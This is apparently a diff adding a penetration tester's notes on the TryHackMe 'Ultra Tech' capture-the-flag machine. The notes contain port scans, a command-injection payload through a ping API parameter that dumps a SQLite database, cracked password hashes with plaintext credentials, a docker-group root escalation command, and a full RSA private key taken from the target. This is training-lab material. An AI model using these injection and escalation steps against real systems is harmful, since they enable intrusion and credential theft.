@@ -1,0 +1,151 @@
+THM - Ultra Tech - 27 Oct 2022
+
+10.10.230.50
+
+---------------------
+users
+
+creds:
+r00t:n100906	ssh
+admin:mrsheafy
+
+flags:
+
+	user.txt
+	root.txt
+--------------------------------------
+
+
+PORT      STATE SERVICE
+21/tcp    open  ftp
+22/tcp    open  ssh
+8081/tcp  open  blackice-icecap
+31331/tcp open  unknown
+
+
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
+|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
+|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (EdDSA)
+8081/tcp  open  http    Node.js Express framework
+|_http-cors: HEAD GET POST PUT DELETE PATCH
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: 15C1B7515662078EF4B5C724E2927A96
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
+MAC Address: 02:03:70:72:3C:65 (Unknown)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+8081 http --> 
+/
+UltraTech API v0.1.3
+
+Fuzzing Dir
+000344:  C=200      0 L	       8 W	     39 Ch	  "auth"
+002785:  C=500     10 L	      61 W	   1094 Ch	  "ping"
+
+/auth
+You must specify a login and a password
+
+/ping
+?ip=$IP
+
+https://www.hackerone.com/ethical-hacker/how-command-injections
+http://10.10.230.50:8081/ping?ip=10.10.114.148%20`ls`
+
+ping: utech.db.sqlite: Name or service not known 
+
+http://10.10.230.50:8081/ping?ip=10.10.114.148%20`cat%20utech.db.sqlite`
+ping: ) \ufffd\ufffd\ufffd(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded 
+
+crackstation.net
+r00t
+f357a0c52799563c7c7b76c1e7543a32
+n100906
+
+admin
+0d0ea5111e3c1def594c1684e3b9be84
+mrsheafy
+
+r00t@ultratech-prod:~$ id
+uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
+
+***docker group
+https://gtfobins.github.io/gtfobins/docker/
+
+r00t@ultratech-prod:/home/lp1$ docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+bash                latest              495d6437fc1e        3 years ago         15.8MB
+r00t@ultratech-prod:/home/lp1$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
+
+
+root@320bb1f20024:~/.ssh# cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
+sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
+jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
+NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
+hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
+jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
+tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
+YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
+wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
+BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
+5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
+o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
+tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
+eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
+/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
+t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
+lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
+4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
+96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
+kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
+v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
+6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
+gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
+MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
+bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
+-----END RSA PRIVATE KEY-----
+
+
+
+
+
+
+
+31331 http -->
+
+Fuzzing
+
+dir /
+images
+cdd
+js
+
+files / 
+000103:  C=200      6 L	      24 W	  15086 Ch	  "favicon.ico"
+000241:  C=200      5 L	       6 W	     53 Ch	  "robots.txt"
+000062:  C=200    139 L	     531 W	   6092 Ch	  "index.html"
+005162:  C=200     65 L	     229 W	   2534 Ch	  "what.html"
+robots.txt
+Allow: *
+User-Agent: *
+Sitemap: /utech_sitemap.txt
+
+/
+/index.html
+/what.html
+/partners.html
+
+/partners is a login screen
+
